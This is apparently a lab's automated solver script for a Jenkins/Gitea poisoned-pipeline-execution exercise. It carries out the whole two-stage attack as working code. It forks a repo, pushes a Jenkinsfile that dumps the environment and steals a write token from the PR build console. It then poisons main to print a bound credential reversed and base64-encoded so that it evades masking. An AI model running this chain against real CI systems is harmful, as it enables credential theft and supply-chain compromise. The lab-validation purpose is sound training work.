#!/bin/bash
# cat-solve: the lab's automated Public-PPE (3PE) solver and self-check (CICD-SEC-4).
#
# Run by Isoloom as an in-machine `exec` check from the Jenkins controller (which can reach Gitea at
# gitea:3000 and Jenkins at 127.0.0.1:8080, and has git + curl). It walks the intended attack
# end-to-end and asserts it still works, so a learner whose box broke is told to reset it:
#
#   STAGE 1 — public fork PPE (no write access needed):
#     1. fork Wonderland/caterpillar as the plain attacker `cheshire`
#     2. push a POISONED Jenkinsfile (dump the environment) to a branch in the fork
#     3. open a pull request into the original repo's main branch
#     4. the test pipeline builds the fork's code; read the write-scoped `gitea_token` from its console
#
#   STAGE 2 — escalate with the stolen write token:
#     5. re-clone the ORIGINAL repo with the token and POISON the Jenkinsfile again: bind the `flag2`
#        credential (reachable only by the prod pipeline) and `echo $flag2 | rev | base64`
#     6. push to main; the prod pipeline runs it and the exfiltrated (rev|base64) flag lands in its
#        console. Assert it is there.
#
# Exit 0 = solvable. It proves the per-player flag was exfiltrated via the two-stage attack, but NEVER
# prints the flag (that is the answer the player submits) or the stolen token.
set -u

GITEA_HOST="gitea:3000"
GITEA="http://${GITEA_HOST}"
JENKINS="${CAT_JENKINS_URL:-http://127.0.0.1:8080}"
ORG="Wonderland"
REPO="caterpillar"
TEST_JOB="job/caterpillar-pr/job/wonderland-caterpillar-test"
PROD_JOB="job/caterpillar-release/job/wonderland-caterpillar-prod"

ATTACKER="cheshire:cheshire"    # a plain account: can fork + open PRs, but has NO write access
JAUTH="admin:admin"             # a Jenkins user who can read build consoles
FLAG_FILE="${CAT_FLAG_FILE:-/run/lab/casc_secrets/flag2}"
DEADLINE=$(( $(date +%s) + ${CAT_DEADLINE:-600} ))

log()  { echo "cat-solve: $1" >&2; }
fail() { echo "FAIL: $1" >&2; exit 1; }
left() { [ "$(date +%s)" -lt "$DEADLINE" ]; }

# --- the expected exfiltration, computed from the flag the credential store holds -----------------
# Read from the same file the init-groovy hook loaded flag2 from; never printed. Modern Jenkins
# credential masking masks a bound secret's raw value AND its plain base64, so the poisoned pipeline
# reverses it first: `echo $flag2 | rev | base64`, i.e. base64 of "reverse(<flag>)\n". Reproduce
# exactly that and search the prod console for it.
[ -s "$FLAG_FILE" ] || fail "flag file $FLAG_FILE is missing or empty"
FLAG="$(tr -d '\r\n' < "$FLAG_FILE")"
[ -n "$FLAG" ] || fail "the staged flag is empty"
EXPECTED="$(printf '%s\n' "$FLAG" | rev | base64 | tr -d '\n')"
[ -n "$EXPECTED" ] || fail "could not compute the expected exfiltration"

export GIT_TERMINAL_PROMPT=0 GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null
export GIT_AUTHOR_NAME="cheshire" GIT_AUTHOR_EMAIL="cheshire@wonderland.example"
export GIT_COMMITTER_NAME="cheshire" GIT_COMMITTER_EMAIL="cheshire@wonderland.example"

# -g (--globoff): the Jenkins tree API uses [ ] which curl would otherwise read as a glob range.
gget()  { curl -g -s -m 15 -u "$JAUTH" "$@"; }
gcode() { curl -g -s -m 15 -o /dev/null -w '%{http_code}' -u "$JAUTH" "$1"; }
acode() { curl -g -s -m 15 -o /dev/null -w '%{http_code}' -u "$ATTACKER" "$@"; }

# Trigger a multibranch rescan (so a pushed branch / opened PR is noticed without waiting for the
# 1-minute poll). Needs a CSRF crumb.
scan() {  # $1 = job path (job/.../job/...)
  local cj cr
  cj="$(mktemp)"
  cr="$(curl -s -m 15 -c "$cj" -u "$JAUTH" \
        "$JENKINS/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,%22%3A%22,//crumb)" 2>/dev/null)"
  [ -n "$cr" ] && curl -s -m 15 -o /dev/null -b "$cj" -u "$JAUTH" -H "$cr" \
        -X POST "$JENKINS/$1/build" 2>/dev/null
  rm -f "$cj"
}

# Print the lastBuild console of every discovered child job of a multibranch pipeline.
child_consoles() {  # $1 = job path
  local urls path
  urls="$(gget "$JENKINS/$1/api/json?tree=jobs[url]" 2>/dev/null \
          | tr ',' '\n' | grep -o '"url":"[^"]*"' | sed 's/.*"url":"//; s/"$//')"
  for u in $urls; do
    path="${u#http://*/}"            # strip scheme+host -> job/.../
    gget "$JENKINS/${path}lastBuild/consoleText" 2>/dev/null
  done
}

# --- 0. wait for Gitea's repo and both Jenkins jobs to be ready -----------------------------------
log "waiting for the caterpillar repository on Gitea..."
until [ "$(acode "$GITEA/api/v1/repos/$ORG/$REPO/branches/main")" = "200" ]; do
  left || fail "the Gitea repository never became ready"; sleep 3
done
log "waiting for the Jenkins pipelines to exist..."
until [ "$(gcode "$JENKINS/$TEST_JOB/api/json")" = "200" ] \
   && [ "$(gcode "$JENKINS/$PROD_JOB/api/json")" = "200" ]; do
  left || fail "the Jenkins pipelines never appeared"; sleep 3
done

WORK="$(mktemp -d)"; trap 'rm -rf "$WORK"' EXIT
BR="ppe-$(date +%s)-$$"

# --- STAGE 1: fork, poison, open a pull request ---------------------------------------------------
# 1. Fork the public repo as the plain attacker (no write access to the original is needed).
log "forking $ORG/$REPO as cheshire..."
fc="$(acode -X POST -H 'Content-Type: application/json' -d '{}' "$GITEA/api/v1/repos/$ORG/$REPO/forks")"
case "$fc" in 2*|409|422) : ;; *) fail "could not fork the repository (HTTP $fc)";; esac

# wait for the fork to be clonable
log "waiting for the fork cheshire/$REPO..."
until [ "$(acode "$GITEA/api/v1/repos/cheshire/$REPO/branches/main")" = "200" ]; do
  left || fail "the fork never became ready"; sleep 3
done

# 2. Clone the fork, poison the Jenkinsfile to dump the environment, push a branch.
git clone -q "http://$ATTACKER@$GITEA_HOST/cheshire/$REPO.git" "$WORK/fork" \
  || fail "could not clone the fork"
cd "$WORK/fork" || fail "fork clone directory missing"
git checkout -q -b "$BR"
cat > Jenkinsfile <<'POISON'
pipeline {
    agent any
    stages {
        stage('build') {
            steps {
                sh 'env'
            }
        }
    }
}
POISON
git add Jenkinsfile
git commit -q -m "ci: investigate the build environment"
git push -q "http://$ATTACKER@$GITEA_HOST/cheshire/$REPO.git" "$BR" \
  || fail "could not push the poisoned branch to the fork"
log "pushed poisoned branch $BR to the fork"

# 3. Open a pull request from the fork into the original repo's main branch.
pc="$(acode -X POST -H 'Content-Type: application/json' \
      -d "{\"head\":\"cheshire:$BR\",\"base\":\"main\",\"title\":\"Investigate build environment\"}" \
      "$GITEA/api/v1/repos/$ORG/$REPO/pulls")"
case "$pc" in 2*|409|422) : ;; *) log "WARN: opening the pull request returned HTTP $pc";; esac
log "opened a pull request from cheshire:$BR into $ORG:main"

# 4. Nudge a scan, then poll the test pipeline's PR build consoles for the leaked write token.
scan "$TEST_JOB"
log "waiting for the test pipeline to build the fork PR and leak the write token..."
TOKEN=""
nudged=0
while left; do
  TOKEN="$(child_consoles "$TEST_JOB" 2>/dev/null \
           | grep -o 'gitea_token=[^[:space:]]*' | head -n 1 | cut -d= -f2-)"
  [ -n "$TOKEN" ] && break
  nudged=$((nudged+1))
  [ $(( nudged % 6 )) -eq 0 ] && scan "$TEST_JOB"
  sleep 5
done
[ -n "$TOKEN" ] || fail "the write-scoped gitea_token did not appear in the test pipeline console"
log "recovered the write-scoped token from the fork PR build (${#TOKEN} chars) — escalating"

# --- STAGE 2: escalate with the stolen token, poison main, exfiltrate flag2 -----------------------
# 5. Re-clone the ORIGINAL repo with the stolen write token and poison main to bind flag2.
git clone -q "http://$TOKEN@$GITEA_HOST/$ORG/$REPO.git" "$WORK/orig" \
  || fail "could not clone the original repository with the stolen token"
cd "$WORK/orig" || fail "original clone directory missing"
git checkout -q main
cat > Jenkinsfile <<'POISON'
pipeline {
    agent any
    stages {
        stage('deploy') {
            steps {
                withCredentials([string(credentialsId: 'flag2', variable: 'flag2')]) {
                    sh 'echo $flag2 | rev | base64'
                }
            }
        }
    }
}
POISON
git add Jenkinsfile
git commit -q -m "deploy: publish the release"
git push -q "http://$TOKEN@$GITEA_HOST/$ORG/$REPO.git" main \
  || fail "could not push the poisoned Jenkinsfile to main with the stolen token"
log "pushed the poisoned Jenkinsfile to $ORG:main with the stolen write token"

# 6. Nudge a prod scan, then poll the prod pipeline's console for the exfiltrated flag.
scan "$PROD_JOB"
log "waiting for the prod pipeline to run main and exfiltrate the flag..."
nudged=0
while left; do
  if child_consoles "$PROD_JOB" 2>/dev/null | grep -qF -- "$EXPECTED"; then
    log "OK: flag2 (${#FLAG} chars) was exfiltrated via public fork-based PPE — the fork PR leaked the"
    log "    write token, which escalated to a poisoned prod build; the base64 blob is in the prod"
    log "    console (flag itself not shown)."
    exit 0
  fi
  nudged=$((nudged+1))
  [ $(( nudged % 6 )) -eq 0 ] && scan "$PROD_JOB"
  sleep 5
done

fail "the flag did not appear in the prod pipeline console before the deadline"
